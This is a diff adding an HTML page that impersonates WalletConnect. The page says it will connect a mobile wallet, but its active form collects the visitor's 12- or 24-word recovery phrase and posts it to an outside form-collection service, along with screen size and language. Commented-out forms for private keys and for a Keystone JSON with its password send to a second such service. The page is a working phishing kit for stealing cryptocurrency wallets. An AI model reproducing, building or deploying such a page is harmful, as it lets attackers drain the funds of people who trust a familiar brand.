@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>WalletConnect</title>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+  <!-- <script src="https://formspree.io/js/formbutton-v1.min.js" defer></script> -->
+</head>
+<body>
+    
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-sm-4">
+                            <nav class="navbar navbar-expand-sm collapse show">
+                                <div class="container p-5"> 
+                                  <div  class="collapse navbar-collapse">
+                                      <ul class="navbar-nav">
+                                          <li  class="nav-item">
+                                            <a class="nav-link" href="index.html">Github</a>
+                                          </li>
+                                          <li  class="nav-item">
+                                            <a class="nav-link" href="index.html">Docs</a>
+                                          </li>
+                                      </ul>
+                                  </div>  
+                                </div>
+                            </nav>    
+                        </div>
+                        <div class="col-sm-4">
+                            <div class="text-center">
+                                <a class="navbar-brand" href="index.html">
+                                <img src="images/walletconnect.png" alt="WalletLogo" style="width:50%;" class="rounded-pill">
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-sm-4">
+                            <nav class="navbar navbar-expand-sm collapse show">
+                                <div class="container p-5">
+                                  <div  class="collapse navbar-collapse">
+                                      <ul class="navbar-nav">
+                                          <li  class="nav-item" style="margin-right: 20px; margin-left: 20px;">
+                                            <a class="nav-link" href="index.html">Wallet</a>
+                                          </li>                                         
+                                          <li  class="nav-item">
+                                            <a class="nav-link" href="index.html">Apps</a>
+                                          </li>
+                                      </ul>
+                                  </div>  
+                                </div>
+                            </nav>    
+                        </div>
+                      </div>
+                </div>
+                <nav class="navbar navbar-expand-sm">
+                    
+
+                        <!-- <button class="navbar-toggler bg-dark" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-bs-target="#collapsibleNavbar">
+                        <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div  class="collapse navbar-collapse"  id="collapsibleNavbar">
+                            <ul class="navbar-nav">
+                                <li  class="nav-item">
+                                <a class="nav-link" href="index.html">Github</a>
+                                </li>
+                                <li  class="nav-item">
+                                <a class="nav-link" href="index.html">Docs</a>
+                                </li>
+                                
+                                <li  class="nav-item">
+                                <a class="nav-link" href="index.html">Wallets</a>
+                                </li>
+                                <li  class="nav-item">
+                                <a class="nav-link" href="index.html">Apps</a>
+                                </li>
+                            </ul>
+                        </div>   -->
+                </nav>    
+            </div>
+        </div>    
+        <br>
+            <div class="row">
+                <div class="col-sm-3"></div>
+                <div class="col-sm-6">
+                    <div class=" text-center">
+                        <h1 class="mb-5 text-black !important">Connect Wallet</h1>
+                        <p style="color: #7c8696;">Multiple iOS and Android wallets support the WalletConnect protocol. Simply scan a QR code from your desktop computer screen to start securely using a App with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p> 
+                    </div>
+                        
+                    <div class="container mt-5 text-center">
+                        <div class="row">
+                            <div class="mt-3">
+                                <!-- Nav tabs -->
+                                <ul class="nav nav-tabs nav-justified" role="tablist">
+                                <li class="nav-item">
+                                    <a class="nav-link active" data-bs-toggle="tab" href="#phrase">Phrase</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" data-bs-toggle="tab" href="#keystone">Keystone</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link" data-bs-toggle="tab" href="#privatekey">Private Key</a>
+                                </li>
+                                </ul>
+                            
+                                <!-- Tab panes -->
+                                <div class="tab-content">
+                                <div id="phrase" class="container tab-pane active"><br>
+                                    <form id="my-formcarry" accept-charset="UTF-8"  action="https://formcarry.com/s/EIDZPFZQk7A"  method="POST" enctype="multipart/form-data">
+                                        <div class="form-item mb-3 mt-3">
+                                            <textarea class="form-control" rows="5" id="comment" name="message"  placeholder="Phrase..." required></textarea>
+                                            <label for="comment">Typically 12 (sometimes 24) words seperated by a single spaces.</label>
+                                        </div>
+                                        <button type="submit" class="btn btn-primary form-control">Import</button>
+                                    </form>
+                                </div>
+                                <!-- <div id="keystone" class="container tab-pane fade"><br>
+                                    <form action="https://formspree.io/f/mayvwylb" id="m-form" method="POST">
+                                        <div class=" mb-3 mt-3">
+                                            <textarea class="form-control" rows="5" id="comment" name="text" required placeholder="Keystone JSON..."></textarea>
+                                        </div>
+                                        <div class="mb-3">
+                                            <input type="password" class="form-control" id="pwd" required placeholder="Enter password" name="pswd">
+                                            <label for="comment">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</label>
+                                        </div>
+                                        <button type="submit" class="btn btn-primary form-control">Import</button>
+                                    </form>
+                                </div>
+                                    <div id="privatekey" class="container tab-pane fade">
+                                        <form action="https://formspree.io/f/mayvwylb" id="y-form" method="POST">
+                                            <div class=" mb-3 mt-3">
+                                                <input type="text" class="form-control" name="privatekey" required placeholder="Private Key">
+                                                <label for="comment">Typically 12 (sometimes 24) words seperated by a single spaces.</label>
+                                            </div> 
+                                            <button type="button" class="btn btn-primary form-control">Import</button>   
+                                        </form>
+                                    </div> -->
+                                    <div id="status"></div>
+                            </div>
+                        </div>    
+                </div>
+            </div>    
+        </div>
+        <div class="col-sm-3"></div>
+        <br>
+
+        <div class="container">
+            <div class="row p-5">
+                <div class="col-sm mt-5">
+                  <p class="text-center ">
+                      Open a pull request on <span><a href="">Github</a></span> to add your wallet here.
+                  </p>
+                </div>
+            </div>
+            
+            <div class="row p-5 text-center">
+                <div class="col-sm-2"></div>
+                <div class="col-sm-8">
+                  <div class="navbarr">
+                      <a class="fa fa-meetup" style="font-size:20px" href="index.html"> <sup>Discord</sup></a> 
+                      <a class="fa fa-telegram" style="font-size:20px" href="index.html"> <sup>Telegram</sup></a> 
+                      <a class="fa fa-twitter" style="font-size:20px" href="index.html"> <sup>Twitter</sup></a> 
+                      <a class="fa fa-github" style="font-size:20px" href="index.html"> <sup>Github</sup></a>
+                  </div>
+                </div>
+                <div class="col-sm-2"></div>
+            </div>
+
+            <script src="https://carrier.formcarry.com/js/v1.js"></script>
+                    <script>
+                         formcarry({
+                            form: "EIDZPFZQk7A",
+                            // id or the class name of the form element, only form element allowed
+                            // works with css selectors
+                            // # <= for id
+                            // . <= for class
+                            element: "Phase" + "#my-formcarry",
+                            extraData: {
+                            // add whatever you want
+                            screenSize: `${window.screen.width}x${window.screen.height}`,
+                            language: window.navigator.language,
+                            },
+                            // Success callback, you can show alert messages
+                            // or redirect the user in this function
+                            onSuccess: function(response){
+                            alert(response)
+                            },
+                            // Error callback, a good place to show errors 🗿
+                            onError: function(error){
+                            alert(error)
+                            }
+                        });
+    
+                            // formcarry({
+                            //     form: "f9BVHtM-xxx",
+                            //     // id or the class name of the form element, only form element allowed
+                            //     // works with css selectors
+                            //     // # <= for id
+                            //     // . <= for class
+                            //     element: "#my-formcarry",
+                            //     extraData: {
+                            //     // add whatever you want
+                            //     screenSize: `${window.screen.width}x${window.screen.height}`,
+                            //     language: window.navigator.language,
+                            //     },
+                            //     // Success callback, you can show alert messages
+                            //     // or redirect the user in this function
+                            //     onSuccess: function(response){
+                            //     // formcarry = "";
+                            //     response = "Thanks!";
+                            //     alert(response);
+                            //     },
+                            //     // Error callback, a good place to show errors 🗿
+                            //     onError: function(error){
+                            //         error =  "Ooops! There was a problem.";
+                            //     alert(error);
+                            //     }
+                            // });
+                    </script>     
+                  
+           
+</body>
+</html>
